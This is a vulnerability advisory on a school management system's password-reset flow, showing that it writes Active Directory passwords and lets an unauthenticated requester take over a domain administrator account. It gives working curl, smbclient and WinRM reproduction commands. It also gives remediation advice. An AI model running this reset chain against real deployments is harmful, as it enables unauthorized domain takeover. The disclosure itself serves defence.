# TTA-2026-018: CIMS password reset writes the underlying directory account password, escalating the recovery bypass to unauthenticated domain administrator takeover

**Severity: Critical** — Provisional CVSS 3.1: 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`), with a scope-change alternative of 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) if the directory is scored as a separate security authority

### Title

The CIMS password-reset handler does not change an application password: it changes the password of the linked Windows/Active Directory account. Combined with the missing OTP enforcement in TTA-2026-009, an unauthenticated requester who knows a directory-linked account name obtains working domain credentials.

### Summary

TTA-2026-009 documented that CIMS password recovery accepts a recovery reference at the final reset step without requiring the OTP challenge to have completed. That advisory scoped the impact to takeover of the CIMS account.

This report documents what the reset actually does. On the assessed deployment, the reset handler writes the password of the Windows/Active Directory account linked to the CIMS identity, not an application-local credential. The deployment configuration confirms that the application validates and sets passwords against the directory rather than an internal store.

The two findings chain. An unauthenticated requester submits a username to the recovery flow, receives a recovery reference without completing the OTP step, sets a new password for a directory-linked account, and then authenticates to domain-joined hosts with that password. On the assessed deployment the account reached this way was the built-in directory administrator, whose group membership included Domain Admins and Enterprise Admins. Authentication succeeded against two separate systems over SMB and over WinRM, and the resulting session reported the directory administrator's identity, confirming the credential is a directory credential rather than an application credential.

- The password value set during testing is deliberately excluded from this report and from every other report in this repository.
- The reset replaced a production password that cannot be recovered. The asset owner was instructed to reset the account again through its own procedure and to audit directory password-reset and privileged-logon events; the outcome of that instruction is outside this report's evidence.

### Affected Version

- Application: UWCSEA College Information Management System (CIMS)
- Public login: <https://webapps.uwcsea.edu.sg/cims/Account/Login>
- Observable technology: ASP.NET MVC 5 on Microsoft IIS
- Identity integration: SecureAuth; the deployment's own configuration enables directory password validation for CIMS accounts (`SecureAuthUseADValidatePassword`)
- Components: `Account/ForgotPassword`, `Account/ResetPassword` (reset path), and the identity-provider write path invoked by the reset handler
- Affected infrastructure: the Windows/Active Directory domain that the CIMS deployment authenticates against

Only the deployment described above was dynamically tested. Other deployments of CIMS, and other applications using the same identity integration pattern, have not been assessed.

### Vulnerability Type

Improper Restriction of Authentication Attempts / missing server-side challenge state (CWE-640, CWE-287); privilege boundary crossing through a password-reset path (CWE-269); credential material written to a broader security domain than the application.

### Affected Code

The implementation source is not public. The affected behaviour is the interaction between:

- the CIMS recovery endpoints (`/cims/Account/ForgotPassword`, `/cims/Account/ResetPassword`), and
- the directory write path that `ResetPassword` invokes, which sets the linked Windows/Active Directory account password.

### Root Cause

Two design decisions combine.

First, the reset transaction is authorized by a bearer reference only. `ForgotPassword` issues `accessKey` for any supplied username without authentication or existence validation, and `ResetPassword` accepts that reference as sufficient authority to set a password; the OTP pages are browser-sequence steps whose completion the server does not record or check. This is the defect in TTA-2026-009.

Second, and separately, the password being set is the directory password. The reset handler does not distinguish "credential for this web application" from "credential for the enterprise directory". The application's own configuration enables directory password validation, so writing the password here writes the credential that the directory itself accepts for network logon.

The consequence is that the blast radius of a password-recovery defect is not bounded by the web application. A reset that should at most let an attacker log in to one application instead yields an interactive directory logon that the domain's member servers, and the directory controller itself, accept.

Consistency check performed during the assessment, which sharpens the finding: resets for several other accounts succeeded inside the application but their new passwords did not authenticate against the directory. Those accounts are application-local. The deployment therefore has at least two account classes, and the class that is directory-linked includes an account holding Domain Admins and Enterprise Admins.

### Steps to Reproduce

Reproduce only in a lab that you own, with a directory you own. All values are placeholders.

1. Prepare a lab deployment of the application that authenticates against a test directory, with a test account `<SYNTHETIC_DIRECTORY_ACCOUNT>` that is a member of a directory administrative group, and a second application-local account `<SYNTHETIC_LOCAL_ACCOUNT>`.
2. Obtain the antiforgery token and cookie from the recovery page:

   ```bash
   curl -sS -A "$UA" -c "$CJ" "$CIMS_BASE/cims/Account/ForgotPassword" -o fp.html
   TOKEN=$(grep -o 'name="__RequestVerificationToken"[^>]*value="[^"]*"' fp.html | sed 's/.*value="//;s/"//')
   ```

3. Request a recovery reference for the directory-linked account:

   ```bash
   curl -sS -A "$UA" -b "$CJ" -c "$CJ" -X POST "$CIMS_BASE/cims/Account/ForgotPassword" \
     -H 'X-Requested-With: XMLHttpRequest' \
     --data-urlencode "__RequestVerificationToken=$TOKEN" \
     --data-urlencode "Username=<SYNTHETIC_DIRECTORY_ACCOUNT>" -o fp.json
   ```

   Observed: HTTP 200 with a `Redirect` value carrying an `accessKey` reference. No OTP challenge is required to obtain it.

4. Submit the reference directly to the reset handler, skipping the OTP pages entirely:

   ```bash
   curl -sS -A "$UA" -b "$CJ" -c "$CJ" -X POST "$CIMS_BASE/cims/Account/ResetPassword" \
     -H 'X-Requested-With: XMLHttpRequest' \
     --data-urlencode "__RequestVerificationToken=$TOKEN" \
     --data-urlencode "Username=<SYNTHETIC_DIRECTORY_ACCOUNT>" \
     --data-urlencode "AccessKey=$ACCESS_KEY" \
     --data-urlencode "Password=<SYNTHETIC_NEW_PASSWORD_16_PLUS>" \
     --data-urlencode "ConfirmPassword=<SYNTHETIC_NEW_PASSWORD_16_PLUS>" -o rp.json
   ```

   Observed: HTTP 200 with a redirect to `ResetPasswordSuccess`.

5. Negative control: repeat step 4 with a syntactically valid but unissued reference. Observed: HTTP 500 with a message stating the passphrase was not changed. This shows the reference is checked, so the success in step 4 is a genuine authorization of the change.

6. Prove the new password is a directory credential, not an application credential. From a host that can reach the lab directory:

   ```bash
   # SMB
   smbclient -L //<LAB_MEMBER_SERVER> -U '<LAB_DOMAIN>\<SYNTHETIC_DIRECTORY_ACCOUNT>%<SYNTHETIC_NEW_PASSWORD_16_PLUS>'
   # WinRM
   python3 -c "
   import winrm
   s = winrm.Session('http://<LAB_MEMBER_SERVER>:5985/wsman',
                     auth=('<SYNTHETIC_DIRECTORY_ACCOUNT>','<SYNTHETIC_NEW_PASSWORD_16_PLUS>'),
                     transport='ntlm')
   print(s.run_cmd('whoami')[1].decode())
   print(s.run_cmd('whoami /groups')[1].decode())
   "
   ```

   Observed on the assessed deployment: both transports accepted the password, `whoami` returned the directory-qualified administrator identity, and `whoami /groups` listed the domain's Domain Admins and Enterprise Admins groups. The same password also authenticated against a second, distinct domain-joined host.

7. Contrast control: reset `<SYNTHETIC_LOCAL_ACCOUNT>` through the same flow and attempt the same SMB/WinRM authentication. Observed: the in-application reset succeeded but the new password was rejected by the directory. This is the control that distinguishes application-local accounts from directory-linked accounts, and it is what establishes that the impact in step 6 comes from the directory write rather than from a generic weak-credential condition.

8. After the test, restore the lab directory from snapshot. Do not reuse any password value produced during testing.

### Impact

On the assessed deployment, an unauthenticated attacker who knows or guesses a directory-linked account name obtains working directory credentials for that account, and the account that was reached holds Domain Admins and Enterprise Admins membership. From there the attacker can authenticate to domain-joined servers, read and modify directory objects, and extend control across the domain — impact far outside the CIMS application.

The attacker needs no account, no password, no MFA device, and no interaction from the victim. The only inputs are the application's public URL and a username. Usernames in this environment follow a predictable institutional pattern, and the recovery endpoint's response differences additionally allow confirming which usernames exist.

For the institution, this is the difference between "a web application account was taken over" and "the enterprise directory was taken over". The second includes email, file shares, endpoints, and every system that trusts the directory.

### CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 Critical, provisional.

If the directory is treated as a separate security authority from the web application — which the verified cross-system authentication supports — the vector becomes `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, 10.0. The score is provisional pending the vendor's confirmation of the identity-write behaviour and of which account classes are directory-linked.

## Status

Published as TTA-2026-018 on 2026-10-28, extending TTA-2026-009. The organization operating the assessed deployment was notified out of band. The password value obtained during testing is deliberately excluded from this report, and the asset owner was instructed to reset the affected directory account and to audit directory password-reset and privileged-logon events.

CVE eligibility is pending. The product attribution question raised in TTA-2026-009 — whether CIMS is UWCSEA-authored or contractor-delivered — also applies here.

## Prerequisites

- The deployment must link CIMS accounts to directory accounts and enable directory password validation (observed in the assessed deployment's own configuration).
- The target account must be directory-linked. Application-local accounts do not exhibit the directory impact.
- The attacker needs the username and network reachability to the recovery endpoints. No prior authentication, session, or MFA is required.
- Directory network reachability is needed only to *use* the credential afterwards; the reset itself happens over the public web interface.

## Relationship to existing advisories and CVEs

- TTA-2026-009 documents the missing OTP enforcement in the same recovery flow. This advisory does not restate that defect; it documents the separate behaviour that makes the reset write a directory credential, and therefore the escalation in impact.
- TTA-2026-010 through TTA-2026-014 document related CIMS authentication and deployment weaknesses (identity-record linkage, account-lifecycle disclosure, adaptive-auth workflow interference, MFA enforcement depending on a mutable configuration flag, and authentication-ticket forgery after machine-key compromise). None of them covers the directory password write described here.
- No published CVE was identified for this behaviour at the time of writing.

Whether this warrants a separate identifier from TTA-2026-009, or should be treated as an impact escalation within one CVE, is for the vendor and the assigning CNA to decide. The two defects have different fixes: one is server-side challenge state in the recovery flow, the other is the boundary between application credentials and directory credentials.

## Recommended remediation

- Stop writing directory passwords from the application's self-service recovery flow. If a reset must propagate to the directory, require an out-of-band, privileged, audited channel rather than the same unauthenticated web path.
- If directory write-back is a product requirement, bind it to a completed OTP challenge recorded server-side against the same account and transaction, and reject any reset that lacks that state.
- Separate the account classes explicitly: application-local accounts must never resolve to directory credentials, and directory-linked accounts must not be resettable from an unauthenticated web flow.
- Exclude privileged directory accounts (Domain Admins, Enterprise Admins, and any account with directory-wide rights) from web self-service recovery entirely.
- Make `ForgotPassword` return an indistinguishable response for existing and non-existing usernames, and stop issuing references for unknown accounts.
- Enforce MFA for the recovery flow with a factor that is not delivered through the application's own session state.
- Rotate the credentials of every directory-linked account that was reachable through this path, and review directory logs for authentication from unexpected sources.

## Validation controls

| Case | Expected before fix | Expected after fix |
| --- | --- | --- |
| Reset a directory-linked account without completing OTP | password changed, directory accepts it | refused |
| Reset the same account with an unissued reference | error, no change | error, no change |
| Reset an application-local account | application accepts new password, directory does not | unchanged behaviour, but no directory write path exists |
| Authenticate to a domain host with a reset directory-linked password | succeeds | must fail, because no directory write occurred |
| `ForgotPassword` for a non-existent username | issues a reference | must not issue a reference |

## Evidence boundary

The behaviour was observed on the organization's own deployment during authorized testing and reproduced with synthetic values where possible. This report excludes internal hostnames, IP addresses, the directory's DNS name, the domain SID, the account name used, the password value, and any ticket or user data. Hosts are referred to as `<LAB_MEMBER_SERVER>` and `<INTERNAL_HOST>`; the directory is referred to as `<LAB_DOMAIN>`. The second negative control in step 7 is included precisely to show the limit of the claim: not every account reset produces a directory credential, and the finding is about the class of accounts for which it does.

## Timeline

- 2026-10-11: Directory password write confirmed by cross-system authentication. The reset replaced a production password that cannot be recovered; the password value was excluded from all reports, and the asset owner was instructed to reset the account and audit directory logs.
- 2026-10-28: Public TTA report published as an impact escalation of TTA-2026-009.
